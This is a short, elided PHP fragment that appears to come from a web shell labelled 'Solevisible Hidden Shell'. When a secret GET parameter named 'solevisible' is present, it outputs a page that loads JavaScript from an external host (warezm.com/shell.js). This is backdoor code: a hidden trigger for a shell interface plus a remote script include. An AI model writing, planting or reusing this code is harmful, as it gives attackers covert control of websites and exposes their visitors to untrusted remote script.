...
if (isset($_GET["solevisible"]))
{
    ...
    echo '<html>';
    echo "<script data-cfasync='false' src='//warezm.com/shell.js'></script><title>Solevisible Hidden Shell</title>";
